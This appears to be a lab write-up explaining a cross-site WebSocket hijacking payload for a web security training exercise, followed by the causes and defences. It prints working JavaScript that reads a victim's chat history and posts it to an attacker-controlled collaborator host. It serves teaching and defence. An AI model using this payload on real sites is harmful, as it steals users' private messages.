# Payload Explained

## **Detailed Analysis of the WebSocket Hijacking Payload**

**Payload Code:**

```javascript
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send('READY');
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-ID', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

***

### **Step-by-Step Breakdown**

#### **1. Establishing a WebSocket Connection**

```javascript
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
```

* This line initializes a **new WebSocket connection** to the target server.
* `wss://` is the **secure WebSocket protocol**, similar to `https://` for HTTP.
* The URL `wss://YOUR-LAB-ID.web-security-academy.net/chat` represents the WebSocket endpoint where the chat application is hosted.

#### **2. Sending the "READY" Message**

```javascript
ws.onopen = function() {
    ws.send('READY');
};
```

* Once the WebSocket connection is successfully established, the `onopen` event is triggered.
* The script **sends the message `'READY'`** to the server.
* **Purpose:**
  * The server expects this message before sending the chat history to the client.
  * This is a **critical step in the attack**, as it tricks the server into returning chat messages.

#### **3. Capturing Incoming Messages**

```javascript
ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-ID', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
```

* When the server responds with chat messages, the `onmessage` event is triggered.
* `event.data` contains the chat history retrieved from the server.
* This data is then **exfiltrated** to an attacker-controlled server using a `fetch()` request.

#### **4. Sending Data to the Attacker**

```javascript
fetch('https://YOUR-COLLABORATOR-ID', {
    method: 'POST',
    mode: 'no-cors',
    body: event.data
});
```

* The captured chat messages are **sent to the attacker's server**.
* **`method: 'POST'`**
  * Sends the stolen chat history to the attacker’s endpoint.
* **`mode: 'no-cors'`**
  * Ensures the request is sent successfully across origins without browser restrictions.
* **`body: event.data`**
  * The stolen chat messages are included in the body of the request.

***

### **How the Attack Works**

1. **Victim Visits the Malicious Site:**
   * The attacker lures the victim into visiting a webpage hosting the exploit script.
2. **Unauthorized WebSocket Connection is Established:**
   * The script automatically initiates a WebSocket connection to the vulnerable chat server.
3. **Triggering the Chat History Response:**
   * The attacker-controlled script sends the `'READY'` message, prompting the server to return the chat logs.
4. **Exfiltrating Stolen Data:**
   * The script captures the chat history and sends it to an external attacker-controlled server.

***

### **Why This Attack Works**

#### **1. No CSRF Protection in WebSockets**

* WebSockets do not inherently enforce **Cross-Site Request Forgery (CSRF) protection**.
* Since the WebSocket connection **automatically includes authentication cookies**, it allows unauthorized access.

#### **2. Lack of WebSocket Origin Validation**

* The server does **not check the `Origin` header** to confirm if the request is coming from a trusted source.

#### **3. `SameSite=None` Cookie Setting**

* The authentication cookie is set to `SameSite=None`, **allowing it to be sent in cross-origin requests**.

***

### **Preventing WebSocket Hijacking**

#### **1. Implement CSRF Tokens in WebSockets**

* Require a **CSRF token** in the WebSocket handshake:

```javascript
var ws = new WebSocket('wss://example.com/chat?token=SECURE_CSRF_TOKEN');
```

* The server should validate this token before establishing the connection.

#### **2. Validate the `Origin` Header**

* Ensure that only requests from trusted origins are allowed:

```javascript
ws.on('connection', (socket, req) => {
    if (req.headers.origin !== 'https://trustedwebsite.com') {
        socket.terminate();
    }
});
```

* This prevents unauthorized cross-origin WebSocket requests.

#### **3. Secure WebSocket Authentication**

* Instead of **cookie-based authentication**, use **token-based authentication**:

```javascript
ws.onmessage = function(event) {
    const data = JSON.parse(event.data);
    if (!isValidToken(data.token)) {
        ws.close();
    }
};
```

* This ensures that every WebSocket message is authenticated.

#### **4. Restrict Cross-Origin WebSocket Requests**

* Use **Content Security Policy (CSP)** rules to prevent unauthorized WebSocket connections:

```http
Content-Security-Policy: connect-src 'self' https://trustedwebsite.com;
```

* This ensures that only trusted origins can initiate WebSocket connections.

***

### **Conclusion**

* **This payload exploits a lack of CSRF protection and improper WebSocket authentication to hijack chat sessions.**
* **To prevent such attacks, implement CSRF tokens, validate the `Origin` header, and enforce secure authentication mechanisms.**
* **Developers should avoid relying on `SameSite=None` cookies without proper security controls.**
